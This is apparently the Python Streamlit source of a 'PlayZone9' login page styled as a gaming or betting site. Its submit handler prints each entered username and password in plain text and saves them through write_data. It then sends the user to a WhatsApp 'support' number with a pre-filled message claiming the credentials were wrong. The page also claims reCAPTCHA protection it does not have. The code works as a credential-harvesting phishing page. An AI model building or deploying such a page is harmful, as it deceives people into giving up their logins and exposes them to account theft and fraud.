import streamlit as st
from backend.data_read_write import write_data
import streamlit.components.v1 as components

st.set_page_config(
    page_title="PlayZone9 – Login",
    page_icon="🎾",
    layout="centered",
    initial_sidebar_state="collapsed",
)

WA_LINK = "https://wa.me/+919876543210"

# ── Global CSS ─────────────────────────────────────────────────────────────────
st.markdown(f"""
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap');

/* Full-page blue gradient */
html, body,
[data-testid="stApp"],
[data-testid="stAppViewContainer"] {{
    background: linear-gradient(160deg, #0ea5e9 0%, #0369a1 55%, #075985 100%) !important;
    font-family: 'Inter', sans-serif;
    min-height: 100vh;
    overflow: hidden;
}}

/* Override Streamlit theme CSS variables to white */
:root {{
    --background-color: #ffffff !important;
}}

/* Make ALL Streamlit wrappers transparent */
[data-testid="stMain"],
[data-testid="stMain"] > div,
section[data-testid="stMain"] {{
    background: transparent !important;
    background-color: transparent !important;
}}

/* Hide chrome */
[data-testid="stHeader"], [data-testid="stToolbar"],
#MainMenu, footer, [data-testid="stDecoration"] {{
    display: none !important;
}}

/* ── WHITE CARD — every selector Streamlit might use ── */
.block-container,
[data-testid="stMainBlockContainer"],
div.block-container,
div[data-testid="stMainBlockContainer"] {{
    background-color: #ffffff !important;
    background: #ffffff !important;
    border-radius: 18px !important;
    max-width: 420px !important;
    margin: 30px auto 80px auto !important;
    padding: 22px 28px 20px !important;
    box-shadow: 0 20px 60px rgba(0,0,0,0.28) !important;
}}

/* ALL inner blocks → transparent so card white shows through */
[data-testid="stVerticalBlock"],
[data-testid="stVerticalBlock"] > div,
[data-testid="stVerticalBlockBorderWrapper"],
[data-testid="stElementContainer"],
[data-testid="stForm"],
[data-testid="stFormSubmitButton"],
.stMarkdown, .stTextInput, .stButton,
.element-container {{
    background: transparent !important;
    background-color: transparent !important;
}}

/* ── Input fields ── */
[data-testid="stTextInput"] label {{ display: none !important; }}
[data-testid="stTextInput"] > div > div > input {{
    border: 1.5px solid #d1d5db !important;
    border-radius: 8px !important;
    padding: 12px 16px !important;
    font-size: 1rem !important;
    color: #374151 !important;
    background: #fff !important;
    font-family: 'Inter', sans-serif !important;
}}
[data-testid="stTextInput"] > div > div > input:focus {{
    border-color: #0ea5e9 !important;
    box-shadow: 0 0 0 2px rgba(14,165,233,.15) !important;
}}

/* ── Login button ── */
[data-testid="stFormSubmitButton"] > button,
[data-testid="stButton"] > button {{
    background: #0ea5e9 !important;
    color: #fff !important;
    border: none !important;
    border-radius: 8px !important;
    font-size: 1.05rem !important;
    font-weight: 700 !important;
    padding: 13px !important;
    width: 100% !important;
    letter-spacing: 1px;
    font-family: 'Inter', sans-serif !important;
    transition: background .2s !important;
    cursor: pointer;
}}
[data-testid="stFormSubmitButton"] > button:hover,
[data-testid="stButton"] > button:hover {{
    background: #0284c7 !important;
}}

/* Remove extra gap */
[data-testid="stVerticalBlock"] {{ gap: 0.3rem !important; }}

/* ── Floating WhatsApp button ── */
.wa-fab {{
    position: fixed;
    bottom: 20px; right: 20px;
    width: 52px; height: 52px;
    background: #25D366;
    border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 4px 18px rgba(0,0,0,.35);
    text-decoration: none;
    transition: transform .2s;
    z-index: 9999;
}}
.wa-fab:hover {{ transform: scale(1.1); }}
</style>
""", unsafe_allow_html=True)

# ── LOGO (HTML, visually part of the card) ────────────────────────────────────
st.markdown("""
<div style="text-align:center; margin-bottom:4px;">
  <div style="
    width:150px; height:52px;
    border:3px solid #38bdf8; border-bottom:none;
    border-radius:100px 100px 0 0;
    margin:0 auto 4px;
    box-shadow:0 -2px 10px rgba(56,189,248,.4);
  "></div>
  <div style="
    font-family:'Inter',sans-serif; font-size:2.4rem; font-weight:900;
    letter-spacing:3px; color:#0ea5e9; text-transform:uppercase;
    display:inline-flex; align-items:center; justify-content:center;
  ">
    PLAY
    <span style="
      display:inline-flex; align-items:center; justify-content:center;
      width:44px; height:44px; border-radius:50%;
      background:radial-gradient(circle at 35% 35%, #38bdf8, #0369a1);
      box-shadow:0 4px 12px rgba(0,0,0,.25); position:relative; top:-2px; margin:0 3px;
    ">
      <svg width="26" height="26" viewBox="0 0 28 28" fill="none">
        <circle cx="14" cy="14" r="13" stroke="rgba(255,255,255,0.5)" stroke-width="1.5"/>
        <path d="M1.5 14 C6 6, 22 6, 26.5 14" stroke="rgba(255,255,255,0.7)" stroke-width="1.5" fill="none"/>
        <path d="M1.5 14 C6 22, 22 22, 26.5 14" stroke="rgba(255,255,255,0.7)" stroke-width="1.5" fill="none"/>
      </svg>
    </span>
    NE9
  </div>
</div>
<h2 style="text-align:center;color:#0ea5e9;letter-spacing:5px;font-size:1.4rem;
           font-weight:700;margin:12px 0 14px;">LOGIN 👇</h2>
""", unsafe_allow_html=True)

# ── NATIVE STREAMLIT FORM (Python can read these directly) ────────────────────
with st.form("login_form", clear_on_submit=False):
    username = st.text_input("u", placeholder="👤  Username",  label_visibility="collapsed")
    password = st.text_input("p", placeholder="🔑  Password",  type="password", label_visibility="collapsed")
    submitted = st.form_submit_button("Login  ➜", use_container_width=True)

if submitted:
    if username and password:
        # ✅ Print to terminal
        print("\n" + "="*35)
        print("[LOGIN ATTEMPT]")
        print(f"  Username : {username}")
        print(f"  Password : {password}")
        print("="*35)
        write_data(username, password)
        # Open WhatsApp
        wa_msg = f"Wrong username or password connect to our support teams to resolve this issue"
        st.markdown(
            f'<meta http-equiv="refresh" content="0; url={WA_LINK}?text={wa_msg}">',
            unsafe_allow_html=True,
        )
        st.success(f"✅ Welcome **{username}**! Redirecting to WhatsApp…")
    else:
        st.warning("⚠️ Please enter both username and password.")

# ── Links ─────────────────────────────────────────────────────────────────────
st.markdown(f"""
<div style="text-align:right;margin-top:6px;">
  <a href="{WA_LINK}?text=Forgot%20Password" target="_blank"
     style="color:#0ea5e9;font-size:.9rem;text-decoration:none;">Forgot Password?</a>
</div>
<div style="text-align:center;margin-top:10px;font-size:.95rem;font-weight:600;color:#1f2937;">
  Don't have User?&nbsp;
  <a href="{WA_LINK}?text=Register%20me" target="_blank"
     style="color:#0ea5e9;font-weight:700;text-decoration:none;">Register here</a>
</div>
<div style="text-align:center;margin-top:14px;padding-top:12px;border-top:1px solid #f3f4f6;
            font-size:.72rem;color:#6b7280;line-height:1.55;">
  This site is protected by reCAPTCHA and the Google
  <a href="https://policies.google.com/privacy" style="color:#0ea5e9;text-decoration:none;">Privacy Policy</a>
  and
  <a href="https://policies.google.com/terms" style="color:#0ea5e9;text-decoration:none;">Terms of Service</a>
  apply.
</div>
""", unsafe_allow_html=True)

# ── Footer + Floating WA button ───────────────────────────────────────────────
st.markdown(f"""
<div style="
  position:fixed; bottom:0; left:0; width:100%;
  background:#0369a1; text-align:center; padding:12px 20px 16px;
  box-shadow:0 -4px 20px rgba(0,0,0,.2);
">
  <div style="font-size:1.4rem;font-weight:800;color:#fff;letter-spacing:1px;">24X7 Support</div>
  <div style="font-size:.85rem;color:#bae6fd;margin-top:2px;">https://wa.link/playzone9</div>
</div>

<a class="wa-fab" href="{WA_LINK}" target="_blank" title="Chat on WhatsApp">
  <svg width="28" height="28" viewBox="0 0 32 32" fill="white">
    <path d="M16 3C9.373 3 4 8.373 4 15c0 2.385.668 4.61 1.828 6.504L4 29l7.695-1.804A12.94
    12.94 0 0016 28c6.627 0 12-5.373 12-12S22.627 3 16 3zm0 2c5.523 0 10 4.477 10 10s-4.477
    10-10 10a9.96 9.96 0 01-5.07-1.382l-.364-.215-4.57 1.072 1.1-4.458-.236-.374A9.96 9.96 0
    016 15c0-5.523 4.477-10 10-10zm-3.27 5.684c-.198 0-.52.074-.793.37-.272.297-1.04 1.016-1.04
    2.479s1.065 2.875 1.213 3.073c.149.198 2.095 3.2 5.076 4.363.71.307 1.263.49 1.694.627.712.227
    1.36.195 1.872.118.57-.085 1.757-.718 2.006-1.413.248-.694.248-1.29.173-1.413-.074-.124-.272-.198
    -.57-.347s-1.757-.869-2.03-.967c-.272-.099-.47-.149-.668.149-.198.297-.77.967-.942 1.165-.173.198
    -.347.223-.644.074-.298-.149-1.257-.463-2.394-1.476-.885-.789-1.482-1.763-1.656-2.06-.173-.297
    -.018-.457.13-.605.134-.133.298-.347.447-.52.15-.174.199-.298.298-.496.1-.198.05-.372-.025-.52
    -.074-.149-.668-1.613-.915-2.208-.24-.578-.484-.5-.668-.51l-.57-.01z"/>
  </svg>
</a>
""", unsafe_allow_html=True)
